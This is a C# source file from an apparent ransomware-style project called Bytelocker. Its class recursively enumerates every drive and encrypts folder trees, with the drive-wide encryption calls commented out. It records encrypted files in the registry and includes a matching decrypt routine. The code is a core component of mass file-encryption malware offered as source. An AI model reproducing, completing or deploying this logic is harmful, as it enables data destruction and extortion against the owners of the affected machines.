using Bytelocker.Settings;
using Bytelocker.UI;
using System;
using System.Collections.Generic;
using System.IO;

namespace Bytelocker.CryptoManager
{
    class CryptoManagerMainHandler
    {
        private RegistryManager rm;

        public CryptoManagerMainHandler()
        {
            this.rm = new RegistryManager();
            this.rm.CreateMainKey();
        }

        public void DecryptAll()
        {
            FileManager fm = new FileManager();
            List<String> files = rm.ReadAllValues(RegistryManager.FILES_KEY_NAME);

            if (!(files[0] == "null"))
            {
                foreach (String file_path in files)
                {
                    MainWindow.current_decrypt_file = file_path;

                    fm.ChooseFile(file_path);
                    fm.SetupFileEncrypter();

                    for (;;)
                    {
                        if (fm.DecryptFile())
                        {
                            fm.DeleteFile();
                            fm.RenameTmpFileToOrig();
                            break;

                        } else
                        {
                            if (!ErrorDecryptMessageBox.showMessageBoxDecryptError(file_path))
                            {
                                fm.removeRegistryItem();
                                break;
                            }
                        }
                    } 
                }
            }
        }
        

        public void EncryptAll()
        {
            DirManager dfm = new DirManager();

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                List<String> dirs = DirManager.GetFoldersRecursive(drive.ToString());
                foreach (String subDir in dirs)
                {
                    //dfm.ChooseDir(subDir);
                    //dfm.EncryptDir();
                }
            }
        }


        public void EncryptFolder(String folder_path)
        {
            DirManager dfm = new DirManager();
            List<String> dirs = DirManager.GetFoldersRecursive(folder_path);
            foreach (String subDir in dirs)
            {
                dfm.ChooseDir(subDir);
                dfm.EncryptDir();
            }
        }
        
        public List<String> FilesEncryptedList()
        {
            try
            {
                return new List<String>(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME));
            } catch (Exception)
            {
                // if the key does not exist return empty list
                return new List<String>();
            }
            
        }
    }
}
